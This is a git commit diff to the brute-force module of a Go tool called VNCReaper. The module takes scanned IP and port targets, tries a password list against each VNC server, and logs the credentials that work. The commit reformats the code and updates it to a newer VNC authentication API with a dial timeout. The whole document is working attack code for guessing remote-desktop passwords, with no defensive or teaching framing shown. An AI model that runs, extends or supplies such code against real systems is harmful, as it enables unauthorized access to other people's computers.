3cac2c0b3f62c03e8a09f54567dd968c18f6843c
comedymoon <kdv.usb@gmail.com>
2025-08-10 00:24:56 +0300

    Replaced structure

--- internal/brute/brute.go
+++ internal/brute/brute.go
@@ -1,69 +1,77 @@
 package brute
 
 import (
-	"fmt"
-	"log"
-	"time"
+    "fmt"
+    "log"
+    "net"
+    "time"
 
-	vnc "github.com/mitchellh/go-vnc"
-	"github.com/comedymoon/VNCReaper/internal/types"
+    vnc "github.com/mitchellh/go-vnc"
+    "github.com/comedymoon/VNCReaper/internal/types"
 )
 
 // BruteManager holds the password list and retry logic
 type BruteManager struct {
-	passwords []string
-	retries   map[string]int
-	maxRetry  int
-	waitTime  time.Duration
+    passwords []string
+    retries   map[string]int
+    maxRetry  int
+    waitTime  time.Duration
 }
 
 // NewBruteManager creates a new manager
 func NewBruteManager(passwords []string) *BruteManager {
-	return &BruteManager{
-		passwords: passwords,
-		retries:   make(map[string]int),
-		maxRetry:  3,
-		waitTime:  10 * time.Second,
-	}
+    return &BruteManager{
+        passwords: passwords,
+        retries:   make(map[string]int),
+        maxRetry:  3,
+        waitTime:  10 * time.Second,
+    }
 }
 
 // TryAll tries all passwords against the given VNC target
 func (bm *BruteManager) TryAll(target types.ScanResult) {
-	addr := fmt.Sprintf("%s:%s", target.IP, target.Port)
+    addr := fmt.Sprintf("%s:%s", target.IP, target.Port)
 
-	if bm.retries[addr] >= bm.maxRetry {
-		log.Printf("[BRUTE] Skipping %s, max retries reached", addr)
-		return
-	}
+    if bm.retries[addr] >= bm.maxRetry {
+        log.Printf("[BRUTE] Skipping %s, max retries reached", addr)
+        return
+    }
 
-	for _, pwd := range bm.passwords {
-		ok := bm.tryPassword(addr, pwd)
-		if ok {
-			log.Printf("[BRUTE] SUCCESS %s password: %s", addr, pwd)
-			return
-		} else {
-			bm.retries[addr]++
-			log.Printf("[BRUTE] FAIL %s password: %s (retry %d/%d)", addr, pwd, bm.retries[addr], bm.maxRetry)
-			time.Sleep(bm.waitTime)
-			if bm.retries[addr] >= bm.maxRetry {
-				log.Printf("[BRUTE] Giving up on %s", addr)
-				return
-			}
-		}
-	}
+    for _, pwd := range bm.passwords {
+        ok := bm.tryPassword(addr, pwd)
+        if ok {
+            log.Printf("[BRUTE] SUCCESS %s password: %s", addr, pwd)
+            return
+        } else {
+            bm.retries[addr]++
+            log.Printf("[BRUTE] FAIL %s password: %s (retry %d/%d)", addr, pwd, bm.retries[addr], bm.maxRetry)
+            time.Sleep(bm.waitTime)
+            if bm.retries[addr] >= bm.maxRetry {
+                log.Printf("[BRUTE] Giving up on %s", addr)
+                return
+            }
+        }
+    }
 }
 
 func (bm *BruteManager) tryPassword(addr string, password string) bool {
-    cfg := &vnc.ClientConfig{
-        SecurityHandlers: []vnc.SecurityHandler{
-            &vnc.PasswordSecurityHandler{Password: password},
-        },
-    }
-
-    conn, err := vnc.Client("tcp", addr, cfg)
+    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
     if err != nil {
         return false
     }
     defer conn.Close()
+
+    cfg := &vnc.ClientConfig{
+        Auth: []vnc.ClientAuth{
+            &vnc.PasswordAuth{Password: password},
+        },
+    }
+
+    client, err := vnc.Client(conn, cfg)
+    if err != nil {
+        return false
+    }
+    defer client.Close()
+
     return true
 }
